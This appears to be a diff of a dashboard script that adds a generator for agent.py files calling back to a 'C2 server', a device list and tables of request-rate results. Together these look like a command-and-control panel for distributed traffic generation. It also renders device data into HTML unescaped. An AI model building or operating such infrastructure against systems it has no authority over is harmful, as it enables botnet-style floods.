@@ -118,7 +118,9 @@ async function testProxy() {
     }
 }
 
-/* ── Bots ─────────────────────────────────────────────────────── */
+/* ── Bots / Agents ────────────────────────────────────────────── */
+let agentResults = [];
+
 async function fetchBots() {
     try {
         const r = await fetch('/api/bots');
@@ -132,51 +134,29 @@ function renderBots() {
     const tb = document.getElementById('bots-body');
     const bc = document.getElementById('bot-count');
     if (bc) bc.textContent = bots.length;
+    if (!tb) return;
     if (!bots.length) {
-        tb.innerHTML = '<tr><td colspan="6" class="muted-cell">No devices registered</td></tr>';
+        tb.innerHTML = '<tr><td colspan="7" class="muted-cell">No devices connected — deploy agent.py to a device to get started</td></tr>';
         return;
     }
     const now = Date.now() / 1000;
     tb.innerHTML = bots.map(b => {
-        const ago = Math.round(now - (b.last_seen || 0));
-        const online = ago < 60;
-        const statusDot = online
-            ? '<span class="dot dot-online" style="display:inline-block;margin-right:5px"></span>'
-            : '<span class="dot dot-offline" style="display:inline-block;margin-right:5px"></span>';
+        const ago    = Math.round(now - (b.last_seen || 0));
+        const online = ago < 30;
+        const dot    = online
+            ? '<span class="dot dot-online" style="display:inline-block"></span>'
+            : '<span class="dot dot-offline" style="display:inline-block"></span>';
+        const agoStr = ago < 60 ? ago + 's ago' : ago < 3600 ? Math.floor(ago/60) + 'm ago' : 'inactive';
         return `<tr>
-            <td>${statusDot}${b.id}</td>
-            <td>${b.ip}</td>
-            <td>${b.label || '-'}</td>
-            <td>${fmtTime(b.registered_at)}</td>
-            <td>${ago < 3600 ? ago + 's ago' : 'inactive'}</td>
+            <td>${dot}</td>
+            <td style="font-family:monospace;font-size:.8rem">${b.id}</td>
+            <td>${b.hostname || b.label || '-'}</td>
+            <td style="font-size:.78rem;color:#64748b">${b.platform || '-'}</td>
+            <td style="font-family:monospace;font-size:.8rem">${b.ip || '-'}</td>
+            <td style="color:${online ? '#16a34a' : '#94a3b8'}">${agoStr}</td>
             <td><button class="btn-link" style="color:#ef4444" onclick="removeBot('${b.id}')">Remove</button></td>
         </tr>`;
     }).join('');
-}
-
-async function registerBot(e) {
-    e.preventDefault();
-    const id    = document.getElementById('bot-id').value.trim();
-    const ip    = document.getElementById('bot-ip').value.trim();
-    const label = document.getElementById('bot-label').value.trim();
-    try {
-        const r = await fetch('/api/bots/register', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ id, ip, label })
-        });
-        const d = await r.json();
-        if (d.ok) {
-            document.getElementById('bot-id').value    = '';
-            document.getElementById('bot-ip').value    = '';
-            document.getElementById('bot-label').value = '';
-            fetchBots();
-        } else {
-            alert('Error: ' + (d.error || 'unknown'));
-        }
-    } catch (err) {
-        alert('Request failed: ' + err.message);
-    }
 }
 
 async function removeBot(id) {
@@ -188,20 +168,65 @@ async function removeBot(id) {
     fetchBots();
 }
 
-function copyScript() {
-    const id    = document.getElementById('bot-id').value.trim()   || 'worker-01';
-    const ip    = document.getElementById('bot-ip').value.trim()   || 'DEVICE_IP';
-    const label = document.getElementById('bot-label').value.trim() || 'My Device';
-    const host  = location.hostname + ':' + location.port;
-    const text  = `curl -s -X POST http://${host}/api/bots/register \\\n  -H "Content-Type: application/json" \\\n  -d '{"id":"${id}","ip":"${ip}","label":"${label}"}'`;
-    navigator.clipboard.writeText(text).then(() => alert('Script copied to clipboard'));
+/* ── Agent generator ──────────────────────────────────────────── */
+function downloadAgent() {
+    const host = document.getElementById('c2-host').value.trim();
+    const port = document.getElementById('c2-port').value.trim() || '5000';
+    const st   = document.getElementById('agent-status');
+    if (!host) {
+        st.className = 'cfg-status err';
+        st.textContent = 'Enter the C2 server IP first.';
+        return;
+    }
+    st.className = 'cfg-status';
+    st.textContent = 'Generating...';
+    const url = `/api/agent/generate?host=${encodeURIComponent(host)}&port=${encodeURIComponent(port)}`;
+    const a   = document.createElement('a');
+    a.href    = url;
+    a.download = `agent_${host.replace(/\./g,'_')}.py`;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    st.className = 'cfg-status ok';
+    st.textContent = 'agent.py downloaded — copy to device and run: python3 agent.py';
+
+    // Update deploy preview
+    const pre = document.getElementById('deploy-preview');
+    if (pre) pre.textContent = `# Copy the downloaded agent.py to each device, then:\npython3 agent_${host.replace(/\./g,'_')}.py\n\n# The agent will connect to ${host}:${port} and await tasks.`;
 }
 
-function copyKeepalive() {
-    const id   = document.getElementById('bot-id').value.trim() || 'worker-01';
-    const host = location.hostname + ':' + location.port;
-    const text = `#!/bin/bash\nSERVER="http://${host}"\nID="${id}"\n\nwhile true; do\n  curl -s -X POST "$SERVER/api/bots/ping" \\\n    -H "Content-Type: application/json" \\\n    -d "{\\"id\\":\\"$ID\\"}" > /dev/null\n  sleep 30\ndone`;
-    navigator.clipboard.writeText(text).then(() => alert('Keep-alive script copied to clipboard'));
+/* ── Agent results ────────────────────────────────────────────── */
+async function fetchAgentResults() {
+    try {
+        const r = await fetch('/api/agent/results');
+        const d = await r.json();
+        agentResults = d.results || [];
+        renderAgentResults();
+    } catch {}
+}
+
+function renderAgentResults() {
+    const tb = document.getElementById('results-body');
+    if (!tb) return;
+    if (!agentResults.length) {
+        tb.innerHTML = '<tr><td colspan="8" class="muted-cell">No results yet</td></tr>';
+        return;
+    }
+    tb.innerHTML = agentResults.map(r => `<tr>
+        <td>${fmtTime(r.ts)}</td>
+        <td style="font-family:monospace;font-size:.78rem">${r.agent_id}</td>
+        <td style="font-family:monospace;font-size:.78rem;color:#94a3b8">${(r.task_id||'').slice(0,8)}</td>
+        <td>${(+r.total).toLocaleString()}</td>
+        <td>${r.rps_actual}</td>
+        <td style="color:#16a34a;font-weight:600">${(+r.success).toLocaleString()}</td>
+        <td style="color:#dc2626;font-weight:600">${(+r.errors).toLocaleString()}</td>
+        <td>${r.wall}s</td>
+    </tr>`).join('');
+}
+
+function clearAgentResults() {
+    agentResults = [];
+    renderAgentResults();
 }
 
 /* ── Charts ───────────────────────────────────────────────────── */
